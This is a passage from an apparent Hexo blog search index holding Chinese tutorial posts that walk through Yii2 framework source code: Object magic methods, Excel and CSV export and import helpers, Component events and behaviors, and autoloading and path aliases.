&#123; return false; &#125; if (is_object($class)) &#123; $class = get_class($class); &#125; else &#123; $class = ltrim($class, '\\'); &#125; $classes = array_merge( [$class], class_parents($class, true), class_implements($class, true) ); foreach ($classes as $class) &#123; if (!empty(self::$_events[$name][$class])) &#123; return true; &#125; &#125; return false;&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>事件Event</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yii基础类Object]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2F%E5%9F%BA%E7%A1%80%E7%B1%BB-Object%2F</url>
    <content type="text"><![CDATA[前言object 作为Yii的最基础的类，只是简单的实现了属性的功能 方法解析构造函数–配置对象通过数组来对对象的属性进行配置 1234567891011121314151617public function __construct($config = [])&#123; if (!empty($config)) &#123; Yii::configure($this, $config); &#125; //调用初始化方法 $this-&gt;init(); &#125;//Yii::configure($this, $config); 给对象的属性赋值如下public static function configure($object, $properties)&#123; foreach ($properties as $name =&gt; $value) &#123; $object-&gt;$name = $value; &#125; return $object;&#125; 获取当前类名获取当前类的类名包含命名空间 12345public static function className()&#123; //后期绑定的类的名称，也就是继承Object类的子类调用此方法是获取的是子类的类名 return get_called_class();&#125; 示例123456789101112131415namespace app\controllers;use Yii;use yii\web\Controller;class TestController extends Controller&#123; public function actionTest() &#123; echo $this-&gt;className(); &#125;&#125;输出app\controllers\TestController 魔术方法通过魔术方法实现了属性功能。属性和成员变量的区别，简单的来理解成员变量是反应结构的(也就是代码实体)，而属性来反应概念的(成员变量的含义)详解 在读取和写入对象的一个不存在的成员变量时，__get() __set()会被自动调用。 Yii正是利用这点，提供对属性的支持的。可以用来实现成员变量的只读或只写功能 __get()当成员变量不存在或者为私有的时候，获取 值时调用这个方法 可以实现一个好处是，如果需要对输出的成员变量的值做一定的处理可以在对应的 getXXX() 方法中实现 1234567891011public function __get($name) &#123; $getter = 'get' . $name; if (method_exists($this, $getter)) &#123; return $this-&gt;$getter(); &#125; elseif (method_exists($this, 'set' . $name)) &#123; throw new InvalidCallException('Getting write-only property: ' . get_class($this) . '::' . $name); &#125; else &#123; throw new UnknownPropertyException('Getting unknown property: ' . get_class($this) . '::' . $name); &#125; &#125; __set()当成员变量不存在或者为私有的时候，设置 值时调用这个方法 可以实现一个好处是，如果需要对赋值的成员变量的值做一定的处理可以在对应的 setXXX() 方法中实现，比如用 trim()去除空格 123456789101112131415161718192021222324public function __set($name, $value)&#123; $setter = 'set' . $name; if (method_exists($this, $setter)) &#123; $this-&gt;$setter($value); &#125; elseif (method_exists($this, 'get' . $name)) &#123; throw new InvalidCallException('Setting read-only property: ' . get_class($this) . '::' . $name); &#125; else &#123; throw new UnknownPropertyException('Setting unknown property: ' . get_class($this) . '::' . $name); &#125;&#125;``` #### `__isset()`测试属性是否存在且值不为 null ，在 `isset($object-&gt;property)` 时被自动调用。 ```phppublic function __isset($name)&#123; $getter = 'get' . $name; if (method_exists($this, $getter)) &#123; return $this-&gt;$getter() !== null; &#125; else &#123; return false; &#125;&#125; __unset()将属性设置成 null 时调用123456789public function __unset($name)&#123; $setter = 'set' . $name; if (method_exists($this, $setter)) &#123; $this-&gt;$setter(null); &#125; elseif (method_exists($this, 'get' . $name)) &#123; throw new InvalidCallException('Unsetting read-only property: ' . get_class($this) . '::' . $name); &#125;&#125; __call()当调用类中的 方法 不存在的时候调用1234public function __call($name, $params)&#123; throw new UnknownMethodException('Calling unknown method: ' . get_class($this) . "::$name()");&#125; 检查是否存在成员变量12345678910111213141516public function hasProperty($name, $checkVars = true)&#123; return $this-&gt;canGetProperty($name, $checkVars) || $this-&gt;canSetProperty($name, false);&#125;public function canGetProperty($name, $checkVars = true)&#123; // 检查对象是否有该方法或属性 return method_exists($this, 'get' . $name) || $checkVars &amp;&amp; property_exists($this, $name);&#125;public function canSetProperty($name, $checkVars = true)&#123; return method_exists($this, 'set' . $name) || $checkVars &amp;&amp; property_exists($this, $name);&#125; 检查是否对象是否存在某方法1234public function hasMethod($name)&#123; return method_exists($this, $name);&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-Excel]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2FExcel%2F</url>
    <content type="text"><![CDATA[说明对excel的操作常用的操作一般还是比较简单的，如果直接去看 phpexcel 可能会感觉方法太多而无从下手，我们这里直接用经过封装过的 yii-excel 来进行学习就相对简单的多，最后也提供了一个更简单的写excel的和读写csv的两个类供参考学习用到的两张表放在最后附件了，自行下载，用到的两个模型类是通过 gii 直接创建的 开始安装 yii-excel直接进项目执行1composer require --prefer-dist moonlandsoft/yii2-phpexcel "*" 安装后 vendor 目录下将会多两个文件夹 moonlandsoft/yii-phpexcel 和 phpoffice/phpexcel 下载excel一表单sheet看代码吧，注释已经很清楚了12345678910111213141516/** * 一表单sheet下载 * @return [type] [description] */public function actionIndex()&#123; $models = LevelModel::find()-&gt;all(); Excel::widget([ 'models' =&gt; $models, 'fileName' =&gt; '下载', // 设置下载文件名 // 'savePath' =&gt; 'D:\ding\wamp64\www\yii\advance\yii-learn\backend\runtime', // 生成在服务器 'mode' =&gt; 'export', // 导出 'columns' =&gt; ['level_id','level_name','p_order'], // 列，通过 $model['level_id'] 来取对应的值 'headers' =&gt; ['level_id' =&gt; 'Header Column 1','level_name' =&gt; 'Header Column 2', 'p_order' =&gt; 'Header Column 3'], // 列对应的header ，title行的数据 ]);&#125; level 表结构 下载的 excel 结果 一表多sheet1234567891011121314151617181920212223242526/** * 一表多sheet 下载 * @param string $value [description] * @return [type] [description] */public function actionMultiple()&#123; $model1 = LevelModel::find()-&gt;all(); $model2 = ColorModel::find()-&gt;all(); Excel::widget([ 'isMultipleSheet' =&gt; true, 'models' =&gt; [ 'sheet1' =&gt; $model1, 'sheet2' =&gt; $model2, ], 'mode' =&gt; 'export', //default value as 'export' 'columns' =&gt; [ 'sheet1' =&gt; ['level_id','level_name','p_order'], 'sheet2' =&gt; ['color_no','color_name','scheme_id'], ], 'headers' =&gt; [ 'sheet1' =&gt; ['level_id' =&gt; 'Header Column 1','level_name' =&gt; 'Header Column 2', 'p_order' =&gt; 'Header Column 3'], 'sheet2' =&gt; ['color_no' =&gt; 'Header Column 1','color_name' =&gt; 'Header Column 2', 'scheme_id' =&gt; 'Header Column 3'], ], ]);&#125; color 表结构 下载的 excel 结果 下载数组格式的使用已经准备好的数据，下载成excel而不依赖model 1234567891011121314151617181920212223/** * 一表单sheet下载 * @return [type] [description] */public function actionData()&#123; $models = [ ['level_id' =&gt; 1, 'level_name' =&gt; 'ding', 'p_order' =&gt; 21], ['level_id' =&gt; 2, 'level_name' =&gt; 'ding', 'p_order' =&gt; 21], // 生成空行 ['level_id' =&gt; '', 'level_name' =&gt; '', 'p_order' =&gt; ''], // 巧妙设置统计信息 ['level_id' =&gt; '总额：', 'level_name' =&gt; '128'], ]; Excel::widget([ 'models' =&gt; $models, 'fileName' =&gt; '下载', // 设置下载文件名 // 'savePath' =&gt; 'D:\ding\wamp64\www\yii\advance\yii-learn\backend\runtime', // 生成在服务器 'mode' =&gt; 'export', // 导出 'columns' =&gt; ['level_id','level_name','p_order'], // 列，通过 $model['level_id'] 来取对应的值 'headers' =&gt; ['level_id' =&gt; 'Header Column 1','level_name' =&gt; 'Header Column 2', 'p_order' =&gt; 'Header Column 3'], // 列对应的header ，title行的数据 ]);&#125; 下载的 excel 结果 读取excel文件数据为了方便测试，直接把excel放在了 web 目录下 读取单文件可以开启 getOnlySheet 注释进行自行测试12345678910111213141516/** * 读取单文件 * @return [type] [description] */public function actionImport()&#123; $fileName = 'exports2.xls'; $data = Excel::widget([ 'mode' =&gt; 'import', // 导入模式 'fileName' =&gt; $fileName, // 文件名 'setFirstRecordAsKeys' =&gt; true, // 是否使用第一行的title字段作为行数据的key 'setIndexSheetByName' =&gt; true, // 是否使用sheet名作为sheet数组的key // 'getOnlySheet' =&gt; '单元1', // 读取那个sheet的name ，如果不设置则读取所有的sheet ]); echo json_encode($data);&#125; excel 文件结构 读取的数据结构 读取多文件一次读取多个文件的数据1234567891011121314151617181920/** * 读取多文件 * @return [type] [description] */public function actionImporttwo()&#123; $fileName1 = 'exports2.xls'; $fileName2 = 'exports1.xls'; $data = Excel::widget([ 'mode' =&gt; 'import', // 导入模式 'fileName' =&gt; [ 'file1' =&gt; $fileName1, 'file2' =&gt; $fileName2, ], 'setFirstRecordAsKeys' =&gt; true, 'setIndexSheetByName' =&gt; true, // 'getOnlySheet' =&gt; '单元1', // 读取那个sheet的name ，如果不设置则读取所有的sheet ]); echo json_encode($data);&#125; 读取的数据结构 其他简单的下载Excel的类看dome比较简单12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?php/** * * // dome * // 下载的文件名 * $filename = 'test'; * // title行 * $titles = ['title1']; * SimpleExcel::echoBegin($filename, $titles); * $data = [ * ['1a'], // 第一行 * ['2a', '2b'], // 第二行 * ]; * SimpleExcel::echoRows($data); * // 追加行 * SimpleExcel::echoRows($data); * // 输出 * SimpleExcel::echoFinish(); * * 注意不要下载数据量太大的，会非常慢，而且excel有行数限制 */class SimpleExcel&#123; /** * 设置请求头 * @param string $filename [description] */ private static function setHeaders($filename = 'data') &#123; // 检验header头是否已经发送 if (headers_sent($file, $line)) &#123; echo 'Header already sent @ ' . $file . ':' . $line; return; &#125; //header('Cache-Control: no-cache;must-revalidate'); //fix ie download bug header('Pragma: no-cache, no-store'); header("Expires: Wed, 26 Feb 1997 08:21:57 GMT"); header('Content-type: application/force-download;charset=utf-8'); header("Content-Disposition: attachment; filename=\"" . $filename . '"'); &#125; /** * * @param [type] $filename [description] * @param array $titles [description] * @return [type] [description] */ public static function echoBegin($filename = '', $titles = []) &#123; if (empty($filename)) &#123; $filename = date("Y-m-d"); &#125; self::setHeaders($filename . '.xls'); echo ' &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;style&gt; td&#123;vnd.ms-excel.numberformat:@&#125; &lt;/style&gt; &lt;/head&gt;'; echo '&lt;table width="100%" border="1"&gt;'; echo '&lt;tr&gt;&lt;th filter=all&gt;' . implode('&lt;/th&gt;&lt;th filter=all&gt;', $titles) . "&lt;/th&gt;&lt;/tr&gt;\r\n"; flush(); &#125; public static function echoRows($rows) &#123; foreach ($rows as $row) &#123; echo '&lt;tr&gt;&lt;td&gt;' . implode('&lt;/td&gt;&lt;td&gt;', $row) . "&lt;/td&gt;&lt;/tr&gt;\r\n"; &#125; flush(); &#125; public static function echoFinish() &#123; echo '&lt;/table&gt;'; flush(); &#125;&#125; csv文件的读取和下载读取csv格式文件和将数据生成csv格式文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;?php/** * * // dome * // 下载的文件名 * $filename = 'test.csv'; * // title行 * $titles = ['title1', 'title2']; * $data = [ * ['1a', '1b'], // 第一行 * ['2a', '2b'], // 第二行 * # 加前引号，表示字符串格式的数据 * ["'".'123456789999.00', '1234567899990000000.00'], * ]; * * SimpleCsv::exportCsv($titles, $data, $filename); * // 上传数据 * // 上传文件的文件名 * $filename = './test.csv'; * var_dump(SimpleCsv::importCsv($filename)); * * csv 格式可以突破excel行数的限制，而且速度也相对较快 * 缺点就是如果需要excel的其他操作需要另存为excel */class SimpleCsv&#123; /** * 导出csv文件 * @param Array $csv_header title行 * @param Array $data 数据 * @param string $filename 文件名 以 .csv 结尾 * @return [type] [description] */ public static function exportCsv(Array $csv_header, Array $data, $filename='') &#123; $filename =$filename?$filename:date('Ymd').'.csv'; //设置文件名 header("Content-type:text/csv"); header("Content-Disposition:attachment;filename=".$filename); header('Cache-Control:must-revalidate,post-check=0,pre-check=0'); header('Expires:0'); header('Pragma:public'); foreach ($csv_header as $k =&gt; $v) &#123; $csv_header[$k] = iconv('utf-8','gb2312',$v); &#125; echo implode(',', $csv_header) . "\n"; $str = ''; foreach($data as $v)&#123; foreach ($v as $key =&gt; $col)&#123; $v[$key] = iconv('utf-8','gb2312//IGNORE',$col); &#125; $abc = implode(',',$v); $str .= $abc. "\n"; &#125; echo $str; flush(); &#125; /** * 导入csv * @param $file * @internal param $filename * @return array|bool */ public static function importCsv($file) &#123; $handle = fopen($file, 'r'); $result = self::inputCsv($handle); //解析csv fclose($handle); //关闭指针 return $result; &#125; /** * 处理导入数据 * @param $handle fopen($file, 'r') * @return array */ private static function inputCsv($handle) &#123; $out = array (); $n = 0; while ($data = fgetcsv($handle)) &#123; $num = count($data); for ($i = 0; $i &lt; $num; $i++) &#123; $out[$n][$i] = mb_convert_encoding($data[$i],'UTF-8','GBK'); &#125; $n++; &#125; return $out; &#125;&#125; 附件level表color表]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>excel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Component实现行为和事件]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2F%E5%9F%BA%E7%A1%80%E7%B1%BB-Component-Behavior%2F</url>
    <content type="text"><![CDATA[前言Component 算是yii最核心的基础类了，同时实现了事件和 BehaviorComponent 虽然继承与 Object ，但为了实现 Behavior 对象的属性和方法的注入， Component 重写了 Object 中所有和调用属性和方法有关的方法。原理也很简单，就是在当前对象找不到的属性或方法，在绑定的行为里再找一遍 例如调用不存在的方法的时候12345678910111213public function __call($name, $params)&#123; // 先确保注册的behaviors绑定 $this-&gt;ensureBehaviors(); // 检查绑定的behaviors中有没有要调用的方法 foreach ($this-&gt;_behaviors as $object) &#123; if ($object-&gt;hasMethod($name)) &#123; return call_user_func_array([$object, $name], $params); &#125; &#125; throw new UnknownMethodException('Calling unknown method: ' . get_class($this) . "::$name()");&#125; Event-事件功能 $handler 事件处理程序 相关属性12//绑定的事件及事件处理程序存储private $_events = []; 事件的绑定123456789101112131415161718192021222324252627282930313233/** * 给当前对象的事件绑定事件处理程序 * * $handler 事件处理程序的格式 * * function ($event) &#123; ... &#125; // anonymous function * [$object, 'handleClick'] // $object-&gt;handleClick() * ['\Page', 'handleClick'] // \Page::handleClick() * 'handleClick' // global function handleClick() * * * 事件处理程序必须是下面的这种形式，$event 是 Event 对象 * * function ($event)&#123;&#125; * * * @param string $name 事件名称 * @param callable $handler 事件处理程序 * @param mixed $data 传递的数据 * @param bool $append 插入到事件处理数组的头部还是尾部 * @see off() */public function on($name, $handler, $data = null, $append = true)&#123; //确定行为已将绑定 $this-&gt;ensureBehaviors(); if ($append || empty($this-&gt;_events[$name])) &#123; $this-&gt;_events[$name][] = [$handler, $data]; &#125; else &#123; //在数组开头插入 array_unshift($this-&gt;_events[$name], [$handler, $data]); &#125;&#125; 事件的解除1234567891011121314151617181920212223242526272829303132/** * 解绑事件 * * @param string $name 事件名称 * @param callable $handler 要解除的事件处理程序 * @return bool if a handler is found and detached */public function off($name, $handler = null)&#123; //确定行为绑定 $this-&gt;ensureBehaviors(); if (empty($this-&gt;_events[$name])) &#123; return false; &#125; if ($handler === null) &#123; unset($this-&gt;_events[$name]); return true; &#125; $removed = false; foreach ($this-&gt;_events[$name] as $i =&gt; $event) &#123; if ($event[0] === $handler) &#123; unset($this-&gt;_events[$name][$i]); $removed = true; &#125; &#125; if ($removed) &#123; //重新排序数组，将unset掉的位置补上 $this-&gt;_events[$name] = array_values($this-&gt;_events[$name]); &#125; return $removed;&#125; 事件的触发1234567891011121314151617181920212223242526272829303132333435363738/** * 触发事件 * 事件发生时，触发事件处理程序 * * @param string $name 事件名称 * @param Event $event 事件对象，如果没有给，将会创建 Event 对象 */public function trigger($name, Event $event = null)&#123; //确定行为绑定 $this-&gt;ensureBehaviors(); if (!empty($this-&gt;_events[$name])) &#123; if ($event === null) &#123; $event = new Event; &#125; if ($event-&gt;sender === null) &#123; //设置发送者 $event-&gt;sender = $this; &#125; $event-&gt;handled = false; $event-&gt;name = $name; foreach ($this-&gt;_events[$name] as $handler) &#123; // 赋值要传递的数据 $event-&gt;data = $handler[1]; //调用事件处理程序handler call_user_func($handler[0], $event); // 如果在某一事件处理程序handler中将$event-&gt;handled设为true，将会不再执行后面的handler if ($event-&gt;handled) &#123; return; &#125; &#125; &#125; // 触发类一级的事件，触发绑定到这个class以及父类和父接口的这个事件 Event::trigger($this, $name, $event);&#125; 查看事件是否绑定绑定1234567891011/** * Returns a value indicating whether there is any handler attached to the named event. * @param string $name the event name * @return bool whether there is any handler attached to the event. */public function hasEventHandlers($name)&#123; //确定行为绑定 $this-&gt;ensureBehaviors(); return !empty($this-&gt;_events[$name]) || Event::hasHandlers($this, $name);&#125; 行为功能所为的行为就是将注册到当前component中的行为类的属性和方法当做自己的使用行为需要行为类 Behavior 和 Component 类结合使用 相关属性12private $_behaviors; 注册行为的原理要使用行为肯定是先要进行注册的，component中大多数方法会调用 ensureBehaviors() 方法来先确认绑定，我们来看一下逻辑1234567891011121314151617181920212223242526272829303132333435363738394041/*** 确保 [[behaviors()]] 绑定到这个component上*/public function ensureBehaviors()&#123; if ($this-&gt;_behaviors === null) &#123; $this-&gt;_behaviors = []; foreach ($this-&gt;behaviors() as $name =&gt; $behavior) &#123; $this-&gt;attachBehaviorInternal($name, $behavior); &#125; &#125;&#125;/** * 将行为绑定到component对象 * @param string|int $name 行为名字 * @param string|array|Behavior $behavior the behavior to be attached * @return Behavior the attached behavior. */private function attachBehaviorInternal($name, $behavior)&#123; // 不是 Behavior 实例，说是只是类名、配置数组，那么就创建出来 if (!($behavior instanceof Behavior)) &#123; $behavior = Yii::createObject($behavior); &#125; // 匿名行为 if (is_int($name)) &#123; // 行为对象中定义的事件注册到当前对象 $behavior-&gt;attach($this); $this-&gt;_behaviors[] = $behavior; &#125; else &#123; // 已经有一个同名的行为，要先解除，再将新的行为绑定上去。 if (isset($this-&gt;_behaviors[$name])) &#123; $this-&gt;_behaviors[$name]-&gt;detach(); &#125; // 行为对象中定义的事件注册到当前对象 $behavior-&gt;attach($this); $this-&gt;_behaviors[$name] = $behavior; &#125; return $behavior;&#125; 会发现在注册行为对象的时候，行为对象会把它里面定义的事件注册到当前对象 使用行为的原理前面说了， component 为了实现行为，重写了 Object 中的属性以及其他方法，我们这里简单的看一下重写后的属性方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/** * 重写了Object的 __get方法 为了兼用行为 * Returns the value of a component property. * This method will check in the following order and act accordingly: * * - a property defined by a getter: return the getter result * - a property of a behavior: return the behavior property value * * Do not call this method directly as it is a PHP magic method that * will be implicitly called when executing `$value = $component-&gt;property;`. * @param string $name the property name * @return mixed the property value or the value of a behavior's property * @throws UnknownPropertyException if the property is not defined * @throws InvalidCallException if the property is write-only. * @see __set() */public function __get($name)&#123; $getter = 'get' . $name; if (method_exists($this, $getter)) &#123; // read property, e.g. getName() return $this-&gt;$getter(); &#125; /* 检查绑定的behavior是否含有此属性 */ // 将behavior()中配置的behavior添加到_behaviors数组 // behavior property $this-&gt;ensureBehaviors(); foreach ($this-&gt;_behaviors as $behavior) &#123; // 是否存在属性 if ($behavior-&gt;canGetProperty($name)) &#123; return $behavior-&gt;$name; &#125; &#125; if (method_exists($this, 'set' . $name)) &#123; throw new InvalidCallException('Getting write-only property: ' . get_class($this) . '::' . $name); &#125; throw new UnknownPropertyException('Getting unknown property: ' . get_class($this) . '::' . $name);&#125;/** * 设置属性 * Sets the value of a component property. * This method will check in the following order and act accordingly: * * - a property defined by a setter: set the property value * - an event in the format of "on xyz": attach the handler to the event "xyz" * - a behavior in the format of "as xyz": attach the behavior named as "xyz" * - a property of a behavior: set the behavior property value * * Do not call this method directly as it is a PHP magic method that * will be implicitly called when executing `$component-&gt;property = $value;`. * @param string $name the property name or the event name * @param mixed $value the property value * @throws UnknownPropertyException if the property is not defined * @throws InvalidCallException if the property is read-only. * @see __get() */public function __set($name, $value)&#123; $setter = 'set' . $name; if (method_exists($this, $setter)) &#123; // set property $this-&gt;$setter($value); return; /** 下面这两个是在配置数组中有用到 */ // 如果以 on 开头，进行事件绑定 &#125; elseif (strncmp($name, 'on ', 3) === 0) &#123; // on event: attach event handler $this-&gt;on(trim(substr($name, 3)), $value); return; // 如果以 as 开头 绑定行为 &#125; elseif (strncmp($name, 'as ', 3) === 0) &#123; // as behavior: attach behavior $name = trim(substr($name, 3)); $this-&gt;attachBehavior($name, $value instanceof Behavior ? $value : Yii::createObject($value)); return; &#125; // 看绑定的行为中是否存在此属性 // behavior property $this-&gt;ensureBehaviors(); foreach ($this-&gt;_behaviors as $behavior) &#123; if ($behavior-&gt;canSetProperty($name)) &#123; $behavior-&gt;$name = $value; return; &#125; &#125; if (method_exists($this, 'get' . $name)) &#123; throw new InvalidCallException('Setting read-only property: ' . get_class($this) . '::' . $name); &#125; throw new UnknownPropertyException('Setting unknown property: ' . get_class($this) . '::' . $name);&#125; 行为的绑定方式静态的绑定覆盖behaviors()例如：123456789101112131415161718192021222324252627class User extends ActiveRecord&#123; public function behaviors() &#123; return [ // 匿名的行为，仅直接给出行为的类名称 MyBehavior::className(), // 名为myBehavior2的行为，也是仅给出行为的类名称 'myBehavior2' =&gt; MyBehavior::className(), // 匿名行为，给出了MyBehavior类的配置数组 [ 'class' =&gt; MyBehavior::className(), 'prop1' =&gt; 'value1', 'prop3' =&gt; 'value3', ], // 名为myBehavior4的行为，也是给出了MyBehavior类的配置数组 'myBehavior4' =&gt; [ 'class' =&gt; MyBehavior::className(), 'prop1' =&gt; 'value1', 'prop3' =&gt; 'value3', ] ]; &#125;&#125; 配置方式这个通过配置方式创建对象( Yii::createObject() )时，由于不存在的成员变量时会调用 Component 的 __set() 方法，方法中会进行注册例如：123456789[ 'as myBehavior2' =&gt; MyBehavior::className(), 'as myBehavior3' =&gt; [ 'class' =&gt; MyBehavior::className(), 'prop1' =&gt; 'value1', 'prop3' =&gt; 'value3', ],] 动态的绑定调用组件(Compoent)的 attachBehavior() 方法yii\base\Compoent::attachBehaviors()12345678910111213141516171819// 和静态绑定原理一样 /** * 绑定单个 **/public function attachBehavior($name, $behavior)&#123; $this-&gt;ensureBehaviors(); return $this-&gt;attachBehaviorInternal($name, $behavior);&#125;/** * 绑定多个 **/public function attachBehaviors($behaviors)&#123; $this-&gt;ensureBehaviors(); foreach ($behaviors as $name =&gt; $behavior) &#123; $this-&gt;attachBehaviorInternal($name, $behavior); &#125;&#125; 获取绑定的行为1234//获取绑定的单个行为对象$behavior = $Component-&gt;getBehavior('myBehavior2');//获取所有绑定的行为对象$behaviors = $Component-&gt;getBehaviors(); 解除行为解除单个例如：$Component-&gt;detachBehavior(&#39;myBehavior2&#39;);12345678910111213public function detachBehavior($name)&#123; $this-&gt;ensureBehaviors(); if (isset($this-&gt;_behaviors[$name])) &#123; $behavior = $this-&gt;_behaviors[$name]; unset($this-&gt;_behaviors[$name]); // 解绑事件 $behavior-&gt;detach(); return $behavior; &#125; return null;&#125; 解除所有例如：$Component-&gt;detachBehaviors();1234567891011/** * 解绑所有 */public function detachBehaviors()&#123; $this-&gt;ensureBehaviors(); foreach ($this-&gt;_behaviors as $name =&gt; $behavior) &#123; $this-&gt;detachBehavior($name); &#125;&#125; 行为类Behavior行为类就比较简单了，实现的两个方法就是对事件的注册和解绑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Behavior extends Object&#123; // 指向行为本身所绑定的Component对象 public $owner; /** * 子类可以覆盖这个方法，返回一个要绑定到 component 对象上的事件 * * The callbacks can be any of the following: * * - method in this behavior: `'handleClick'`, equivalent to `[$this, 'handleClick']` * - object method: `[$object, 'handleClick']` * - static method: `['Page', 'handleClick']` * - anonymous function: `function ($event) &#123; ... &#125;` * * The following is an example: * * php * [ * Model::EVENT_BEFORE_VALIDATE =&gt; 'myBeforeValidate', * Model::EVENT_AFTER_VALIDATE =&gt; 'myAfterValidate', * ] * * * @return array events (array keys) and the corresponding event handler methods (array values). */ public function events() &#123; return []; &#125; /** * 将行为和component对象绑定起来，并且将事件event注册到component对象 */ public function attach($owner) &#123; $this-&gt;owner = $owner; foreach ($this-&gt;events() as $event =&gt; $handler) &#123; $owner-&gt;on($event, is_string($handler) ? [$this, $handler] : $handler); &#125; &#125; /** * 解绑 */ public function detach() &#123; if ($this-&gt;owner) &#123; foreach ($this-&gt;events() as $event =&gt; $handler) &#123; $this-&gt;owner-&gt;off($event, is_string($handler) ? [$this, $handler] : $handler); &#125; $this-&gt;owner = null; &#125; &#125;&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>行为Behavior</tag>
        <tag>事件Event</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii类了解一下]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2F%E5%9F%BA%E7%A1%80%E7%B1%BB-Yii%2F</url>
    <content type="text"><![CDATA[前言Yii这个类相对比较简单，主要做的功能应该就是自动加载，和一些其他全局使用的方法 自动加载Yii自带的自动加载比较简单，一个亮点是为了更快的加载使用了一个自定义的类-路径映射，我们在优化的时候也开把自己要加载的提前放进这个数组中。Composer 自带的自动加载这里也不打算分析了composer自动加载分析] 注册自动加载123456789class Yii extends \yii\BaseYii&#123;&#125;// 注册自动加载，注册到在此之前已经注册的所有自动加载的最前端，也就是会先使用Yii的自动加载进行加载spl_autoload_register(['Yii', 'autoload'], true, true);// 设置类与路径的加载映射，加快自动加载Yii::$classMap = require(__DIR__ . '/classes.php');// 容器Yii::$container = new yii\di\Container(); 自动加载逻辑123456789101112131415161718192021222324public static function autoload($className)&#123; // 是否在定义的 类加载映射文件 if (isset(static::$classMap[$className])) &#123; $classFile = static::$classMap[$className]; if ($classFile[0] === '@') &#123; $classFile = static::getAlias($classFile); &#125; // 下面两个else在找不到的时候会直接return，会交给其他自动加载进行处理 &#125; elseif (strpos($className, '\\') !== false) &#123; $classFile = static::getAlias('@' . str_replace('\\', '/', $className) . '.php', false); if ($classFile === false || !is_file($classFile)) &#123; return; &#125; &#125; else &#123; return; &#125; // 加载类文件 include($classFile); // 判断类、接口、trait类是否存在 if (YII_DEBUG &amp;&amp; !class_exists($className, false) &amp;&amp; !interface_exists($className, false) &amp;&amp; !trait_exists($className, false)) &#123; throw new UnknownClassException("Unable to find '$className' in file: $classFile. Namespace missing?"); &#125;&#125; 别名别名一般用来简化路径和url，像框架的基础路径就是通过别名设置的 设置别名 setAlias12345678910111213141516171819202122232425262728293031323334353637383940414243444546public static function setAlias($alias, $path)&#123; //如果不是以 @ 开头的添加 @ if (strncmp($alias, '@', 1)) &#123; $alias = '@' . $alias; &#125; // 别名是否带有 / ;例如：@yii/ding $pos = strpos($alias, '/'); $root = $pos === false ? $alias : substr($alias, 0, $pos); if ($path !== null) &#123; //$alias 的第一个字符和 @ 比较，如果相等返回0，不相等返回的结果可能是1或-1 为 true // 如果 $path 中含有别名，获取别名路径 $path = strncmp($path, '@', 1) ? rtrim($path, '\\/') : static::getAlias($path); if (!isset(static::$aliases[$root])) &#123; if ($pos === false) &#123; static::$aliases[$root] = $path; &#125; else &#123; // 别名中如果带有 / ;存为二维数组 static::$aliases[$root] = [$alias =&gt; $path]; &#125; // 如果已经设置过别名，而且为字符串 &#125; elseif (is_string(static::$aliases[$root])) &#123; if ($pos === false) &#123; // 直接覆盖 static::$aliases[$root] = $path; &#125; else &#123; // 字符串改成数组形式 static::$aliases[$root] = [ $alias =&gt; $path, $root =&gt; static::$aliases[$root], ]; &#125; // 本身就是数组，则直接添加，并排序 &#125; else &#123; static::$aliases[$root][$alias] = $path; krsort(static::$aliases[$root]); &#125; &#125; elseif (isset(static::$aliases[$root])) &#123; //删除 if (is_array(static::$aliases[$root])) &#123; unset(static::$aliases[$root][$alias]); &#125; elseif ($pos === false) &#123; unset(static::$aliases[$root]); &#125; &#125;&#125; 获取别名 getAlias12345678910111213141516171819202122232425262728293031public static function getAlias($alias, $throwException = true)&#123; //$alias 的第一个字符和 @ 比较，如果相等返回0，不相等返回的结果可能是1或-1进入if if (strncmp($alias, '@', 1)) &#123; // not an alias // 不是别名，不是以 @ 开头 return $alias; &#125; // 别名是否带有 / ;例如：@yii/ding $pos = strpos($alias, '/'); $root = $pos === false ? $alias : substr($alias, 0, $pos); if (isset(static::$aliases[$root])) &#123; // 如果是字符串，则表示存的是路径 if (is_string(static::$aliases[$root])) &#123; return $pos === false ? static::$aliases[$root] : static::$aliases[$root] . substr($alias, $pos); &#125; foreach (static::$aliases[$root] as $name =&gt; $path) &#123; // 在 $alias/ 中匹配 $name/ ,如果存在，就截取路径 if (strpos($alias . '/', $name . '/') === 0) &#123; return $path . substr($alias, strlen($name)); &#125; &#125; &#125; if ($throwException) &#123; throw new InvalidParamException("Invalid path alias: $alias"); &#125; return false;&#125; 其他小方法创建对象创建对象最终是通过容器进行创建的，方便解决依赖1234567891011121314151617181920public static function createObject($type, array $params = [])&#123; // 字符串，代表一个类名、接口名、别名。 if (is_string($type)) &#123; // 全局容器获取实例，并解决其依赖关系 return static::$container-&gt;get($type, $params); // 是个数组，代表配置数组，必须含有 class 元素。 &#125; elseif (is_array($type) &amp;&amp; isset($type['class'])) &#123; $class = $type['class']; unset($type['class']); return static::$container-&gt;get($class, $params, $type); // 是个PHP callable则调用其返回一个具体实例。 &#125; elseif (is_callable($type, true)) &#123; // 解决回调函数的依赖 return static::$container-&gt;invoke($type, $params); &#125; elseif (is_array($type)) &#123; throw new InvalidConfigException('Object configuration must be an array containing a "class" element.'); &#125; throw new InvalidConfigException('Unsupported configuration type: ' . gettype($type));&#125; 配置对象属性值通过数组配置对象对应的属性值12345678public static 